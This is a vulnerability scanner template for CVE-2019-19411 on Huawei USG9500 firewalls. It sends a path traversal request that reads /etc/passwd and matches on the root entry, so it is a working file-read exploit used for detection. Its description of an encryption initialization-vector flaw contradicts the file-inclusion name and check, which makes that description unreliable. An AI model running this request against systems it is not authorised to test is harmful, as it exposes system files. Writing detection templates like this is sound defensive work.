id: CVE-2019-19411

info:
  name: Huawei Firewall - Local File Inclusion
  author: taielab
  severity: low
  description: |
    USG9500 with versions of V500R001C30SPC100, V500R001C30SPC200, V500R001C30SPC600, V500R001C60SPC500, V500R005C00SPC100, V500R005C00SPC200 have an information leakage vulnerability. Due to improper processing of the initialization vector used in a specific encryption algorithm, an attacker who gains access to this cryptographic primitive may exploit this vulnerability to cause the value of the confidentiality associated with its use to be diminished.
  impact: |
    Attackers with network access can exploit the weakened encryption to potentially recover confidential information that was meant to be protected by the encryption algorithm.
  remediation: |
    Upgrade to a patched firmware version provided by Huawei or apply vendor-recommended mitigations.
  reference:
    - https://www.huawei.com/en/psirt/security-advisories/huawei-sa-20200115-01-firewall-en
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 3.7
    cve-id: CVE-2019-19411
    cwe-id: CWE-665
    epss-score: 0.02952
    epss-percentile: 0.86149
    cpe: cpe:2.3:h:huawei:usg9500:-:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: huawei
    product: usg9500
    shodan-query: title:"HUAWEI"
  tags: cve,cve2019,huawei,firewall,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/umweb/../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:[x*]:0:0:"

      - type: word
        part: header
        words:
          - "application/octet-stream"

      - type: status
        status:
          - 200
# digest: 4a0a0047304502210082104ddb6fcca4be3895ba6f9b77793c6ee4ce3719322eece9d0d477732a2add02201865c2ce9fb7276f09ad50b7f5ad0c8e3a4b7ab0483306e97098f15e2101a924:922c64590222798bb761d5b6d8e72950